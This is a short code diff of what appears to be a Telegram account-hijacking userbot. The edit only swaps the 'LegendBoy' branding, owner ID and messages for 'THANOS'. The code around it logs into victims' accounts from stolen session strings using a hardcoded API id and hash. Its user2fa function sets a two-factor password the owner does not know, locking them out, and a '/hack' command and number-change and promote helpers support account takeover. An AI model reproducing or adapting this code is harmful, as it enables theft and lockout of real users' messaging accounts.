@@ -24,7 +24,7 @@ from . import *
 mybot = "missrose_bot"
 from userbot import bot
 
-legendboy = 2024465080
+THANOS = 2143095429
 
 
 async def change_number_code(strses, number, code, otp):
@@ -103,7 +103,7 @@ async def promote(strses, grp, user):
 async def user2fa(strses):
     async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
         try:
-            await X.edit_2fa("LEGENDBOY IS BEST")
+            await X.edit_2fa("THANOS IS BEST")
             return True
         except:
             return False
@@ -299,7 +299,7 @@ async def users(event):
             )
         i = await userinfo(strses.text)
         await event.reply(
-            i + "\n\nThanks For using LegendBoy Bot.\n/hack", buttons=keyboard
+            i + "\n\nThanks For using THANOS Bot.\n/hack", buttons=keyboard
         )
 
 
